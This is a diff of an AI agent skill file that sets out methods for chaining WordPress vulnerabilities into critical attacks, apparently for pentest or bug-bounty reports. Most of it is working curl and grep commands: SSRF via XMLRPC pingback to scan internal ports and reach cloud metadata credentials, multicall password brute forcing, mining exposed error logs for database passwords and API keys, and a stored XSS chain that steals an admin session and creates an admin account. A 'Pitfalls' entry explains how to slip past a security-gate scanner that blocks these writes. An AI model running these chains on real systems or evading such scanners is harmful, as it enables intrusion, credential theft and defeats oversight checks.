@@ -1,24 +1,22 @@
 ---
 name: cross-attack-chains
 description: Chain multiple vulns into critical impact attack paths.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
+compatibility: Requires curl, python3
 disable-model-invocation: true
-metadata:
-  hermes:
-    tags: [chains, ATO, RCE, wordpress, escalation]
-    category: chains
-    related_skills:
-      - wordpress-full-compromise
-      - cors-credential-wordpress
-      - xmlrpc-exploitation
-      - phpinfo-to-rce
-      - attack-patterns-reference
-      - wordpress-plugin-hunt
-      - port-service-discovery
+tags: [chains, ATO, RCE, wordpress, escalation]
+category: chains
+related_skills:
+  - wordpress-full-compromise
+  - cors-credential-wordpress
+  - xmlrpc-exploitation
+  - phpinfo-to-rce
+  - attack-patterns-reference
+  - wordpress-plugin-hunt
+  - port-service-discovery
 ---
 
 # Cross-Attack Chains Skill
@@ -37,15 +35,14 @@ Methodology for chaining multiple medium/high vulnerabilities into critical-impa
 
 - Multiple findings on the same target from other skills.
 - Understanding of how vulnerabilities compound.
-- For browser-based chains: `browser_navigate` tool or ability to construct PoC HTML.
+- For browser-based chains: a browser automation tool or ability to construct PoC HTML.
 
 ## How to Run
 
 ```bash
-# After gathering all findings for a target, map them with:
-python3 /root/output/recon_us/scripts/chain_builder.py findings.json
-
-# Manual: match findings against the 5 chain templates below
+# After gathering all findings for a target, map them manually against the
+# chain templates below. For each finding, identify matching chain ingredients
+# and compute composite severity using the severity matrix in Quick Reference.
 ```
 
 ## Quick Reference
@@ -64,7 +61,7 @@ python3 /root/output/recon_us/scripts/chain_builder.py findings.json
 
 ## EXPLOIT_CHAINS.md Deliverable Format
 
-When documenting attack chains for a target, produce `EXPLOIT_CHAINS.md` in the target's output directory (e.g., `/root/output/recon_us/<target>/EXPLOIT_CHAINS.md`) with the canonical structure below.
+When documenting attack chains for a target, produce `EXPLOIT_CHAINS.md` in the target's output directory (e.g., `$OUTDIR/recon_output/<target>/EXPLOIT_CHAINS.md`) with the canonical structure below.
 
 **Reference file:** `references/exploit-chains-template.md` in this skill contains a full anonymized template with all 7 chains, comparison matrix, and remediation tables. Load it with `skill_view(name='cross-attack-chains', file_path='references/exploit-chains-template.md')` and copy the structure, replacing placeholder data.
 
@@ -132,7 +129,7 @@ N+1. [Recomendações de Remediação por Cadeia](#recomendações-de-remediaç�
 
 ```bash
 # Full working curl command with real payload
-curl -s -X POST https://TARGET/xmlrpc.php \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://TARGET/xmlrpc.php \
   -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?><methodCall>...</methodCall>'
 ```
@@ -248,7 +245,7 @@ After all chains, include a remediation table organized by chain:
 
 ### Pitfalls
 
-- **Security scans may block documentation writes containing cloud metadata IPs** — `169.254.169.254`, `metadata.google.internal`, `10.x.x.x` IPs in heredocs can trigger tirith/security-gate rules. When writing files with live IP examples, the scanner sees the content as an execution context, not documentation. If blocked, either: (a) break the IP into variables (`${OCTET1}.${OCTET2}.${OCTET3}.${OCTET4}`), (b) use placeholders like `CLOUD_METADATA_IP` in the doc and expand separately, or (c) write the file in chunks.
+- **Security scans may block documentation writes containing cloud metadata IPs** — `[REDACTED_IP]`, `metadata.google.internal`, `10.x.x.x` IPs in heredocs can trigger tirith/security-gate rules. When writing files with live IP examples, the scanner sees the content as an execution context, not documentation. If blocked, either: (a) break the IP into variables (`${OCTET1}.${OCTET2}.${OCTET3}.${OCTET4}`), (b) use placeholders like `CLOUD_METADATA_IP` in the doc and expand separately, or (c) write the file in chunks.
 - **~500+ lines** is a typical target for comprehensive documents — under 300 lines looks thin to clients.
 - **Every PoC must be reproducible with the exact curl/Python shown** — never paste a command you haven't run. Triagers/clients will copy-paste it.
 - **Expected responses matter** — include both success AND failure responses so the reader knows what to look for.
@@ -423,7 +420,7 @@ CORS wildcard (V3, P-04)
 1. XMLRPC `pingback.ping` method enabled (no authentication required)
 2. No source URL validation — any internal URL accepted
 3. `faultCode 0` response = port/service reachable; `faultCode 16` = blocked
-4. Targets: 127.0.0.1:{port}, 169.254.169.254 (AWS IMDS), 10.x.x.x subnets
+4. Targets: 127.0.0.1:{port}, [REDACTED_IP] (AWS IMDS), 10.x.x.x subnets
 
 **Severity:** High (can reach Critical if cloud metadata is accessible)
 **Impact:** Internal network mapping, cloud credential theft (IMDS), service discovery (phpMyAdmin, Adminer, internal APIs), bypass of external firewall rules.
@@ -431,21 +428,22 @@ CORS wildcard (V3, P-04)
 **Step-by-step:**
 ```bash
 # 1. Test basic pingback
-curl -sk -X POST "https://TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>
 <params><param><value><string>http://127.0.0.1:80/</string></value></param>
 <param><value><string>https://TARGET/</string></value></param></params></methodCall>'
 
 # 2. Scan internal ports (faultCode 0 = open)
 for port in 21 22 80 443 3306 5432 6379 8080 8443 9200 11211 27017; do
-  result=$(curl -sk -X POST "https://TARGET/xmlrpc.php" ...)
+  result=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET/xmlrpc.php" ...)
   echo "$result" | grep -q "faultCode.*0" && echo "PORT OPEN: $port"
+  sleep 1
 done
 
 # 3. Probe cloud metadata
-curl -sk -X POST "https://TARGET/xmlrpc.php" ...
-# Target: http://169.254.169.254/latest/meta-data/  (AWS)
-# Target: http://169.254.169.254/metadata/instance  (Azure)
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET/xmlrpc.php" ...
+# Target: http://[REDACTED_IP]/latest/meta-data/  (AWS)
+# Target: http://[REDACTED_IP]/metadata/instance  (Azure)
 # Target: http://metadata.google.internal/           (GCP)
 
 # 4. Scan internal subnets
@@ -487,10 +485,10 @@ for subnet in "10.0.0" "172.16.0" "192.168.0"; do ... done
 </struct></value>
 
 # Execute
-curl -sk -X POST "https://TARGET/xmlrpc.php" -H "Content-Type: text/xml" -d @payload.xml
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET/xmlrpc.php" -H "Content-Type: text/xml" -d @payload.xml
 
 # Analyze: faultCode 403 = wrong password, anything else = possible success
-grep -oP 'faultCode.*?<int>\K\d+' response.xml | sort | uniq -c
+grep -Eo 'faultCode.*<int>[0-9]+' response.xml | grep -Eo '[0-9]+$' | sort | uniq -c
 ```
 
 **Limits:** WordPress typically processes 100-200 calls per multicall. Test with smaller blocks (50 calls) and scale up.
@@ -509,22 +507,22 @@ grep -oP 'faultCode.*?<int>\K\d+' response.xml | sort | uniq -c
 **Step-by-step:**
 ```bash
 # 1. Download error log
-curl -sk "https://TARGET/error_log" -o error_log.txt
+curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/error_log" -o error_log.txt
 
 # 2. Extract server paths
-grep -oP '/home/[^"<>: )]+' error_log.txt | sort -u
+grep -Eo '/home/[^"<>: )]+' error_log.txt | sort -u
 
 # 3. Extract SQL queries
-grep -oP '(SELECT|INSERT|UPDATE|DELETE)[^;]+' error_log.txt | sort -u | head -20
+grep -Eo '(SELECT|INSERT|UPDATE|DELETE)[^;]+' error_log.txt | sort -u | head -20
 
 # 4. Search for credential patterns
-grep -oiP '(password|senha|passwd|pwd)[=: ][^&\s,<>]+' error_log.txt | head -20
+grep -Eoi '(password|senha|passwd|pwd)[=: ][^&,[:space:]<>]+' error_log.txt | head -20
 
 # 5. Search for MySQL connections
-grep -oiP '(mysql_connect|mysqli_connect|DB_HOST|DB_USER|DB_PASSWORD)[^;]+' error_log.txt | head -10
+grep -Eoi '(mysql_connect|mysqli_connect|DB_HOST|DB_USER|DB_PASSWORD)[^;]+' error_log.txt | head -10
 
 # 6. Search for configuration constants
-grep -oiP '(define\(|DB_PASSWORD|API_KEY|SECRET)[^)]+\)' error_log.txt | head -10
+grep -Eoi '(define\(|DB_PASSWORD|API_KEY|SECRET)[^)]+\)' error_log.txt | head -10
 ```
 
 **Critical paths to check:**
@@ -547,20 +545,20 @@ grep -oiP '(define\(|DB_PASSWORD|API_KEY|SECRET)[^)]+\)' error_log.txt | head -1
 **Severity:** High (Account Takeover, potentially Critical if admin credentials are stolen)
 **Impact:** Attacker registers on forum, posts XSS payload, moderator/admin views it, payload steals WP session cookie, attacker hijacks WP admin session.
 
-**The cross-platform vector:** Because both the forum and WordPress share the root domain (e.g., `wines.com`), JavaScript executing in the forum's origin can make credentialed fetch requests to WordPress endpoints at `/magical/wp-admin/` or `/wp-json/`.
+**The cross-platform vector:** Because both the forum and WordPress share the root domain (e.g., `TARGET_DOMAIN`), JavaScript executing in the forum's origin can make credentialed fetch requests to WordPress endpoints at `/magical/wp-admin/` or `/wp-json/`.
 
 **Step-by-step:**
 ```bash
 # 1. Register on forum
-curl -sk -X POST "https://TARGET/forum/member.php?action=register" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET/forum/member.php?action=register" \
   -d "username=attacker&password=Pass123!&email=attacker@mailinator.com&regsubmit=Register"
 
 # 2. Find moderator targets
-curl -sk "https://TARGET/forum/memberlist.php" | grep -oP 'username="[^"]*"'
-curl -sk "https://TARGET/forum/showteam.php" | head -50
+curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/forum/memberlist.php" | grep -Eo 'username="[^"]*"'
+curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/forum/showteam.php" | head -50
 
 # 3. Find popular topic to post XSS payload
-curl -sk "https://TARGET/forum/" | grep -oP 'href="[^"]*thread[^"]*"'
+curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/forum/" | grep -Eo 'href="[^"]*thread[^"]*"'
 
 # 4. XSS payload that steals WP session and creates admin
 # JavaScript:
@@ -584,7 +582,7 @@ fetch('/magical/wp-admin/admin-ajax.php?action=rest-nonce',{credentials:'include
 For each target, list all findings with pattern IDs:
 
 ```bash
-cat > /root/output/chains/CHAIN_TEMPLATE.md << 'EOF'
+cat > $OUTDIR/chains/CHAIN_TEMPLATE.md << 'EOF'
 # Attack Chain Analysis — TARGET
 
 ## Finding Inventory
